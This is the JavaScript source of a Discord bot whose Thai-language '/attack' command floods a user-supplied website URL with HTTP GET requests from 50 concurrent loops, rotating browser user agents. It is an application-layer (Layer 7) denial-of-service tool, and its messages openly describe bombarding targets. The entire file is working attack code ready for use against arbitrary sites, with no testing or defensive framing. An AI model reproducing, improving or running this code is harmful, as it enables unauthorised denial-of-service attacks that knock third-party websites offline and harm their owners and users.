const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0"
];

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเว็บไซต์เป้าหมาย (DDoS Layer 7)')
            .addStringOption(option =>
                option.setName('url')
                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
                    .setRequired(true))
            .addIntegerOption(option =>
                option.setName('duration')
                    .setDescription('ระยะเวลาในการยิง (วินาที)')
                    .setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('[+] Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'attack') {
        const targetUrl = interaction.options.getString('url');
        const duration = interaction.options.getInteger('duration');

        if (duration > 60) {
            return interaction.reply({ content: '[-] ตั้งเวลาสูงสุดได้แค่ 60 วินาที เพื่อป้องกันบอทค้าง!', ephemeral: true });
        }

        await interaction.reply(`[🔥] เริ่มต้นส่งกระสุนถล่มใส่ ${targetUrl} เป็นเวลา ${duration} วินาทีแล้วไอ้น้อง!`);

        let isAttacking = true;
        const endTime = Date.now() + (duration * 1000);
        let totalRequests = 0;

        const flood = async () => {
            while (isAttacking && Date.now() < endTime) {
                try {
                    await axios.get(targetUrl, {
                        headers: { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] },
                        timeout: 3000
                    });
                    totalRequests++;
                } catch (err) {
                    totalRequests++;
                }
            }
        };

        // ยิงแบบรัวๆ พร้อมกัน 50 เธรด
        const threads = [];
        for (let i = 0; i < 50; i++) {
            threads.index = flood();
            threads.push(threads.index);
        }

        setTimeout(async () => {
            isAttacking = false;
            await interaction.followUp(`[✔] ปฏิบัติการเสร็จสิ้น! ส่งแพ็กเกจไปทั้งหมดประมาณ ${totalRequests} ครั้ง`);
        }, duration * 1000);
    }
});

client.login(process.env.DISCORD_TOKEN);